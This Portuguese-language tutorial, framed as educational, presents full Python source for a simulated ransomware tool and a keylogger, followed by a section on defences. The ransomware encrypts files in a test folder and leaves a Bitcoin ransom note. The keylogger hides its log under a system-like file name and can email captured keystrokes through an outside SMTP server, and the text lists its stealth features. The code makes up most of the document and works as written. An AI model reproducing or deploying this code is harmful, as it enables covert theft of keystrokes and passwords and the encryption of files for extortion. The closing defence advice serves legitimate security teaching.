Simulação de Malwares para Estudo de Segurança Cibernética
Este projeto tem finalidade estritamente educacional. Os códigos apresentados devem ser executados apenas em ambiente controlado e isolado (máquina virtual ou sandbox), com autorização explícita do proprietário do sistema. O objetivo é entender o funcionamento de ameaças para melhor defendê-las.

1. Ransomware Simulado
Cria arquivos de teste, criptografa/descriptografa com AES (simétrico) e exibe mensagem de "resgate".

Código: ransomware_sim.py
python
import os
import json
from cryptography.fernet import Fernet
from pathlib import Path

# Diretório com arquivos de teste
TEST_DIR = "./arquivos_teste"
EXTENSOES_ALVO = [".txt", ".docx", ".jpg", ".png", ".pdf"]
CHAVE_FILE = "chave_secreta.key"

def criar_arquivos_teste():
    """Cria arquivos de exemplo para simular vítima"""
    if not os.path.exists(TEST_DIR):
        os.makedirs(TEST_DIR)
    for i in range(3):
        with open(f"{TEST_DIR}/documento_{i}.txt", "w") as f:
            f.write(f"Conteúdo sigiloso do arquivo {i}. Isso é um teste seguro.")

def gerar_chave():
    """Gera chave simétrica e salva em arquivo"""
    chave = Fernet.generate_key()
    with open(CHAVE_FILE, "wb") as f:
        f.write(chave)
    return chave

def carregar_chave():
    """Carrega chave existente"""
    return open(CHAVE_FILE, "rb").read()

def criptografar_arquivo(caminho, chave):
    """Criptografa um único arquivo"""
    fernet = Fernet(chave)
    with open(caminho, "rb") as f:
        dados = f.read()
    dados_cripto = fernet.encrypt(dados)
    with open(caminho, "wb") as f:
        f.write(dados_cripto)
    # Renomeia para indicar extensão criptografada
    os.rename(caminho, caminho + ".encrypted")

def descriptografar_arquivo(caminho, chave):
    """Descriptografa um arquivo .encrypted"""
    if not caminho.endswith(".encrypted"):
        return
    fernet = Fernet(chave)
    with open(caminho, "rb") as f:
        dados_cripto = f.read()
    dados_orig = fernet.decrypt(dados_cripto)
    original = caminho.replace(".encrypted", "")
    with open(original, "wb") as f:
        f.write(dados_orig)
    os.remove(caminho)

def atacar():
    """Simula ataque ransomware: criptografa tudo no diretório alvo"""
    chave = gerar_chave()
    for root, _, files in os.walk(TEST_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in EXTENSOES_ALVO):
                caminho = os.path.join(root, file)
                criptografar_arquivo(caminho, chave)
    # Mensagem de resgate
    with open(f"{TEST_DIR}/LEIA_ME.txt", "w") as f:
        f.write("=== SEUS ARQUIVOS FORAM CRIPTOGRAFADOS ===\n")
        f.write("Envie 0.001 BTC para o endereço 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Após o pagamento, envie um e-mail para resgate@malware.com com o ID do seu PC.\n")
        f.write("Você receberá a ferramenta de descriptografia.\n")
    print("[!] Ataque simulado concluído. Arquivos criptografados e nota de resgate deixada.")

def recuperar():
    """Descriptografa todos os arquivos (simula pagamento)"""
    if not os.path.exists(CHAVE_FILE):
        print("[!] Nenhuma chave encontrada. Não é possível recuperar.")
        return
    chave = carregar_chave()
    for root, _, files in os.walk(TEST_DIR):
        for file in files:
            if file.endswith(".encrypted"):
                caminho = os.path.join(root, file)
                descriptografar_arquivo(caminho, chave)
    print("[+] Arquivos recuperados com sucesso!")
    # Remove nota de resgate
    nota = f"{TEST_DIR}/LEIA_ME.txt"
    if os.path.exists(nota):
        os.remove(nota)

if __name__ == "__main__":
    print("=== SIMULADOR DE RANSOMWARE (uso educacional) ===")
    criar_arquivos_teste()
    escolha = input("Digite 'atacar' para criptografar ou 'recuperar' para descriptografar: ").lower()
    if escolha == "atacar":
        atacar()
    elif escolha == "recuperar":
        recuperar()
    else:
        print("Opção inválida.")
Como testar com segurança:
Crie um ambiente virtual ou máquina virtual sem acesso à rede.

Execute o script – ele cria a pasta ./arquivos_teste e simula o ataque.

Use a opção recuperar para reverter (pois a chave fica salva localmente – na vida real o atacante a manteria remota).

2. Keylogger Simulado
Captura teclas, salva em arquivo .txt de forma discreta e envia por e-mail a cada N intervalos.

Código: keylogger_sim.py
python
import os
import smtplib
import threading
import time
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configurações furtivas
LOG_FILE = "system_log.tmp"   # nome discreto
EMAIL_INTERVALO = 60           # segundos entre envios
EMAIL_ENABLED = False          # mude para True após configurar credenciais

# Configurações de e-mail (preencha com dados reais apenas em ambiente isolado)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ORIGEM = "seu_email_teste@gmail.com"
EMAIL_SENHA = "sua_senha_app"
EMAIL_DESTINO = "seu_outro_email@gmail.com"

# Acumulador de teclas
buffer_teclas = []

def salvar_tecla(tecla):
    """Callback chamada a cada pressionamento"""
    try:
        # Teclas alfanuméricas
        buffer_teclas.append(tecla.char)
    except AttributeError:
        # Teclas especiais
        especiais = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]"
        }
        if tecla in especiais:
            buffer_teclas.append(especiais[tecla])
        else:
            buffer_teclas.append(f"[{tecla.name.upper()}]")

def escrever_log():
    """Escreve o buffer em arquivo e limpa"""
    if not buffer_teclas:
        return
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("".join(buffer_teclas))
    buffer_teclas.clear()

def enviar_email():
    """Envia o arquivo de log por e-mail e o apaga após envio"""
    if not EMAIL_ENABLED:
        return
    if not os.path.exists(LOG_FILE):
        return
    try:
        msg = MIMEBase("application", "octet-stream")
        with open(LOG_FILE, "rb") as f:
            msg.set_payload(f.read())
        encoders.encode_base64(msg)
        msg.add_header("Content-Disposition", f"attachment; filename={LOG_FILE}")
        corpo = MIMEText("Log de teclas capturadas automaticamente.")
        msg.attach(corpo)
        
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, EMAIL_SENHA)
            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
        print("[+] Log enviado por e-mail.")
        os.remove(LOG_FILE)
    except Exception as e:
        print(f"[-] Falha no envio: {e}")

def agendar_envios():
    """Thread que periodicamente envia logs por e-mail"""
    while True:
        time.sleep(EMAIL_INTERVALO)
        escrever_log()
        if EMAIL_ENABLED:
            enviar_email()

def iniciar_keylogger():
    """Inicia a captura de teclas e o agendador de envios"""
    print("[*] Keylogger simulado iniciado. Pressione ESC para parar.")
    # Inicia thread de envio periódico
    if EMAIL_ENABLED:
        threading.Thread(target=agendar_envios, daemon=True).start()
    
    # Listener do teclado
    with keyboard.Listener(on_press=salvar_tecla) as listener:
        # Aguarda até que ESC seja pressionado
        def on_press_escape(key):
            if key == keyboard.Key.esc:
                listener.stop()
        # Não podemos usar o mesmo listener duas vezes; então faremos uma verificação manual
        # Alternativa: rodar listener e depois parar com evento
        # Para simplicidade, vamos parar após 30 segundos ou aguardar interrupção do usuário
        try:
            listener.join()
        except KeyboardInterrupt:
            pass
        finally:
            escrever_log()
            print("[*] Keylogger encerrado. Log salvo.")

if __name__ == "__main__":
    print("=== SIMULADOR DE KEYLOGGER (uso educacional) ===")
    print("ATENÇÃO: Somente execute em ambiente que você possui autorização.")
    resp = input("Deseja ativar envio por e-mail? (Requer configurar credenciais) [s/N]: ")
    if resp.lower() == 's':
        EMAIL_ENABLED = True
        print("Certifique-se de ter preenchido as variáveis SMTP no código.")
    iniciar_keylogger()
Funcionalidades furtivas implementadas:
Nome do arquivo de log: system_log.tmp (simula arquivo temporário do sistema).

Execução em segundo plano (thread para envio).

Captura também teclas especiais (Shift, Enter, espaço).

Envio de e-mail:
Para testar, crie uma conta de e-mail descartável e use senha de aplicativo (no Gmail, ative 2FA e gere senha específica).

Em ambiente real, atacantes usariam servidores SMTP anônimos ou contas comprometidas.

3. Reflexão sobre Defesa
A melhor defesa contra ransomwares e keyloggers é uma abordagem em camadas.

🔹 Antivírus / EDR
Detecção comportamental: keyloggers tentam acessar hooks de teclado; soluções modernas monitoram essas APIs.

Assinaturas: bancos de dados atualizados identificam variantes conhecidas.

Proteção em tempo real: impede execução de scripts suspeitos (ex: Python compilado para .exe).

🔹 Firewall e Controle de Rede
Bloquear tráfego de saída para portas incomuns (SMTP 25/587/465 só para servidores autorizados).

Políticas de egress filtering – impedem que malware envie dados para C2 (Command & Control).

Restringir acesso a serviços de e-mail apenas a aplicações específicas.

🔹 Sandboxing e Isolamento
Executar aplicações suspeitas em máquinas virtuais descartáveis ou contêineres sem rede.

Usar Windows Sandbox, Firejail (Linux) ou Sandboxie.

Navegadores com sandbox integrado (Chrome, Edge) limitam execução de código malicioso.

🔹 Práticas de Usuário e Conscientização
Nunca baixar arquivos de fontes não confiáveis ou clicar em links de e-mails suspeitos.

Desabilitar macros em documentos Office por padrão.

Verificar permissões de aplicativos (ex: por que um editor de texto precisa acessar teclado de forma global?).

Manter sistema e softwares atualizados (patch management).

🔹 Defesas Específicas para Keyloggers
Gerenciadores de senhas com preenchimento automático (evita digitação).

Teclados virtuais para campos críticos (alguns bancos usam).

Anti-keylogger de terceiros que embaralham entradas do teclado.

🔹 Defesas Específicas para Ransomware
Backups 3-2-1: 3 cópias, 2 mídias diferentes, 1 off-site/offline.

Controle de acesso baseado em princípio do menor privilégio (nenhum usuário comum deve ter permissão para escrever em pastas de sistema).

Impedir execução de scripts em pastas temporárias via GPO ou AppLocker.

Ferramentas de honeypot: arquivos isca que disparam alerta quando modificados.

🧪 Como testar defesas com segurança
Use plataformas como ANY.RUN, Joe Sandbox ou Cuckoo para executar malwares reais (ou simulados) e observar o comportamento sem risco ao host principal.

Conclusão do Aprendizado
A implementação de um ransomware simples mostra o quão trivial é para um atacante criptografar arquivos locais. A defesa mais robusta continua sendo backup offline.

Keyloggers podem ser extremamente furtivos, mas soluções de EDR com monitoramento de chamadas de sistema (syscalls) os detectam.

A conscientização do usuário é a última linha de defesa – treinamentos regulares de phishing reduzem drasticamente a superfície de ataque.
